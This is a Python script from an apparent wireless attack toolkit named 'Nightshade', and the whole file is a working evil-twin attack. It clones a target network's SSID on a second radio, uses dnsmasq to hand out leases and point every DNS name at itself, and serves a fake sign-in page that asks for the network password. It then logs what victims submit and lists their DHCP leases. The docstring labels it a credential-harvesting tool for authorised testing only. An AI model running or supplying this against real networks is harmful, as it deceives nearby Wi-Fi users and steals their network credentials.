#!/usr/bin/env python3
"""Rogue AP: clone the selected access point on the external
adapter, hand out DHCP and DNS through dnsmasq, and serve a
portal page that any name resolves to.

The built-in wlan0 keeps the uplink untouched -- hostapd only
takes the external adapter. The run is bounded (5 minutes) and
KEY3 stops it; a SIGTERM handler tears hostapd, dnsmasq and the
portal down and restores the adapter either way.

This is a credential-harvesting tool. AUTHORISED TESTING ONLY.
"""
import signal
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from wifi_tools import (STATE, configured_adapter, monitor_interface,
                        run, selected_network, uplink_interface,
                        wireless_interfaces)

AP_IP = '10.0.0.1'
PSK = 'nightshade123'
DURATION = 300          # 5 minute bound
PORTAL_SRC = Path(__file__).resolve().parent.parent / 'deploy' / 'portal.py'

PORTAL = STATE / 'portal.py'
PORTAL_HTML = STATE / 'portal.html'
HOSTAPD_CONF = STATE / 'hostapd.conf'
DNSMASQ_CONF = STATE / 'dnsmasq.conf'
HOSTAPD_LOG = STATE / 'hostapd.log'
DNSMASQ_LOG = STATE / 'dnsmasq.log'
ROGUE_LOG = STATE / 'rogue-ap.log'
LEASES = STATE / 'rogue-ap.leases'

children = []
iface = ''


def stop(child):
    if child.poll() is None:
        child.terminate()
        try:
            child.wait(3)
        except subprocess.TimeoutExpired:
            child.kill()


def teardown(*_):
    """Kill the daemons and give the adapter back."""
    for child in children:
        stop(child)
    children.clear()
    if iface:
        run(['sudo', '-n', 'ip', 'addr', 'flush', 'dev', iface], 10)
        run(['sudo', '-n', 'ip', 'link', 'set', iface, 'up'], 10)


def portal_page(essid):
    return f'''<!doctype html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title></head>
<body style="background:#0b0714;color:#e8dcf5;font-family:sans-serif;
text-align:center;padding-top:60px">
<h1 style="font-weight:normal">{essid}</h1>
<p>Sign in to continue to the internet.</p>
<form method="post">
<input name="password" type="password" placeholder="Network password"
       style="padding:8px;margin:6px">
<button type="submit"
        style="padding:8px 16px;margin:6px">Connect</button>
</form>
</body></html>'''


def main():
    global iface
    print('NIGHTSHADE / ROGUE AP\n')
    print('AUTHORISED TESTING ONLY\n')
    net = selected_network()
    if not net:
        print('Run Targets first'); return
    channel = str(net.get('channel', ''))
    if not channel.isdigit():
        print('Target channel unknown; rescan with Targets'); return

    # hostapd needs a managed interface, so leave monitor mode first
    # and then pick the external adapter afresh -- while monitoring,
    # the external radio presents itself under a different name.
    mon = monitor_interface()
    if mon:
        run(['sudo', '-n', 'airmon-ng', 'stop', mon], 25)
    uplink = uplink_interface()
    adapter = configured_adapter()
    if not adapter:
        external = [name for name in wireless_interfaces() if name != uplink]
        adapter = external[0] if external else None
    if not adapter or adapter == uplink:
        print('No external adapter; the Rogue AP needs the Alfa.')
        return
    iface = adapter
    # Keep dhcpcd off the address we are about to assign.
    run(['sudo', '-n', 'dhcpcd', '-k', iface], 10)
    run(['sudo', '-n', 'ip', 'link', 'set', iface, 'down'], 10)
    run(['sudo', '-n', 'ip', 'addr', 'flush', 'dev', iface], 10)
    run(['sudo', '-n', 'ip', 'addr', 'add', f'{AP_IP}/24', 'dev', iface], 10)
    run(['sudo', '-n', 'ip', 'link', 'set', iface, 'up'], 10)

    hw_mode = 'a' if int(channel) > 14 else 'g'
    HOSTAPD_CONF.write_text(
        f'interface={iface}\ndriver=nl80211\n'
        f'ssid={net["essid"]}\nhw_mode={hw_mode}\nchannel={channel}\n'
        f'auth_algs=1\nwpa=2\nwpa_passphrase={PSK}\n'
        f'wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n',
        encoding='utf-8')
    DNSMASQ_CONF.write_text(
        f'interface={iface}\ndhcp-range={AP_IP.split(".")[0]}.'
        f'{AP_IP.split(".")[1]}.{AP_IP.split(".")[2]}.10,'
        f'{AP_IP.split(".")[0]}.{AP_IP.split(".")[1]}.'
        f'{AP_IP.split(".")[2]}.100,2h\n'
        f'address=/#/{AP_IP}\nno-resolv\n'
        f'log-queries\ndhcp-leasefile={LEASES}\n',
        encoding='utf-8')
    PORTAL.write_text(PORTAL_SRC.read_text(), encoding='utf-8')
    PORTAL_HTML.write_text(portal_page(net['essid']), encoding='utf-8')
    ROGUE_LOG.write_text('', encoding='utf-8')

    signal.signal(signal.SIGTERM, lambda *_: (teardown(), sys.exit(0)))
    signal.signal(signal.SIGINT, lambda *_: (teardown(), sys.exit(0)))

    print(f'Cloning {net["essid"]} on ch{channel} as {iface}')
    print(f'WPA2 password on the twin: {PSK}')
    print(f'Portal at {AP_IP} for {DURATION // 60} minutes.')
    print('KEY3 stops the AP and restores the adapter.\n')

    with HOSTAPD_LOG.open('w') as hlog:
        children.append(subprocess.Popen(
            ['sudo', '-n', 'hostapd', str(HOSTAPD_CONF)],
            stdout=hlog, stderr=subprocess.STDOUT))
    # Give hostapd a moment to fail loudly if the driver cannot
    # do AP mode, rather than reporting a phantom twin.
    time.sleep(2)
    if children[0].poll() is not None:
        print('hostapd failed to start:')
        print(HOSTAPD_LOG.read_text(errors='replace')[-500:])
        teardown()
        return
    with DNSMASQ_LOG.open('w') as dlog:
        children.append(subprocess.Popen(
            ['sudo', '-n', 'dnsmasq', '--no-daemon',
             f'--conf-file={DNSMASQ_CONF}'],
            stdout=dlog, stderr=subprocess.STDOUT))
    children.append(subprocess.Popen(
        ['sudo', '-n', 'python3', str(PORTAL), str(PORTAL_HTML),
         str(ROGUE_LOG)]))

    deadline = time.time() + DURATION
    while time.time() < deadline:
        time.sleep(5)
        if any(child.poll() is not None for child in children):
            print('\nA daemon died; ending the run.')
            break
    print('\nClosing the rogue AP...')
    teardown()

    hits = ROGUE_LOG.read_text(errors='replace').splitlines()
    if hits:
        print(f'\n{len(hits)} portal event{"s" if len(hits) != 1 else ""}:')
        for line in hits[-10:]:
            print(' ', line)
    else:
        print('No client touched the portal.')
    leases = (LEASES.read_text(errors='replace').splitlines()
              if LEASES.exists() else [])
    if leases:
        print(f'\n{len(leases)} DHCP lease{"s" if len(leases) != 1 else ""}:')
        for line in leases[-5:]:
            parts = line.split()
            if len(parts) >= 3:
                print(f'  {parts[1]} -> {parts[2]}')


if __name__ == '__main__':
    main()
